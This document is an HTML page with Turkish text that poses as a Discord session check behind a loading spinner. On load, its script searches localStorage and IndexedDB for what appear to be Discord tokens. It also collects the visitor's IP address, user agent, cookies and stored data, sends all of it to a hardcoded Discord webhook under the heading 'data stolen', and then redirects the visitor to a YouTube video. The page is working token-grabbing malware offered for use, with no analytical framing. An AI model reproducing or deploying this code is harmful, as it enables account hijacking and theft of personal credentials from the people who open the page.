<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Discord Oturumu Kontrol Ediliyor...</title>
    <style>
        body { background-color: #202225; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #7289da; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { color: white; margin-top: 20px; text-align: center; }
    </style>
</head>
<body>
    <div style="text-align: center;">
        <div class="loader"></div>
        <div id="status">Veriler Taraniyor...</div>
    </div>

<script>
    // WEBHOOK ADRESİNİZ BURAYA
    const WEBHOOK = "https://discord.com/api/webhooks/1565166860897615912/I2CNk0KdLEXpdPkbMLoFTpAChNaeL8sS4YDqEH-26z7lptRg3lOs-UpBMHRbSlSW1Qke";

    async function getIP() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            return (await res.json()).ip;
        } catch { return "Bilinmiyor"; }
    }

    async function grabData() {
        const statusDiv = document.getElementById('status');
        let token = "Bulunamadı";
        let ip = await getIP();
        let userAgent = navigator.userAgent;
        let cookies = document.cookie || "(Boş)";

        // --- 1. LOCALSTORAGE TARAMASI ---
        for (let i = 0; i < localStorage.length; i++) {
            let key = localStorage.key(i);
            let value = localStorage.getItem(key);
            if (value && (value.startsWith("MT") || value.startsWith("EA"))) {
                token = value;
                break;
            }
        }

        // --- 2. INDEXEDDB TARAMASI (Eğer LocalStorage'da bulunamazsa) ---
        if (token === "Bulunamadı") {
            try {
                const dbRequest = indexedDB.open("discord_local_storage");
                dbRequest.onsuccess = (event) => {
                    const db = event.target.result;
                    for (let storeName of db.objectStoreNames) {
                        const store = db.transaction(storeName).objectStore(storeName);
                        const request = store.getAll();
                        request.onsuccess = () => {
                            const data = request.result;
                            for (let item of data) {
                                if (item && typeof item === 'string' && item.length > 50 && (item.startsWith("MT") || item.startsWith("EA"))) {
                                    token = item;
                                    break;
                                }
                            }
                            sendToken(token, ip, userAgent, cookies);
                        };
                    }
                };
            } catch (e) { 
                // Hata olursa direkt gönder
                sendToken(token, ip, userAgent, cookies); 
            }
        } else {
            // LocalStorage bulunduysa direkt gönder
            sendToken(token, ip, userAgent, cookies);
        }
    }

    async function sendToken(finalToken, ip, userAgent, cookies) {
        const statusDiv = document.getElementById('status');
        
        const payload = {
            username: "Token Avcısı",
            avatar_url: "https://cdn-icons-png.flaticon.com/512/25/25231.png",
            embeds: [{
                title: "🔥 VERILER CALINDI! 🔥",
                color: 15158332,
                fields: [
                    { name: "🌐 IP", value: "`" + ip + "`", inline: true },
                    { name: "🧩 User Agent", value: "`" + userAgent.substring(0, 50) + "...`", inline: false },
                    { name: "🍪 Cookies", value: "`" + cookies.substring(0, 1000) + "`", inline: false },
                    { name: "🔑 TOKEN", value: "`" + finalToken + "`", inline: false },
                    { name: "💾 LocalStorage Verisi", value: "`" + JSON.stringify(localStorage).substring(0, 1000) + "`", inline: false }
                ],
                footer: { text: "NoTrack System" },
                timestamp: new Date().toISOString()
            }]
        };

        fetch(WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).then(() => {
            statusDiv.innerText = "✅ Veriler Gönderildi!";
            statusDiv.style.color = "#43b581";
            // YouTube yönlendirmesi veya başka bir siteye atama
            setTimeout(() => window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ", 2000);
        }).catch(e => {
            statusDiv.innerText = "❌ Hata: " + e.message;
        });
    }

    window.onload = grabData;
</script>
</body>
</html>
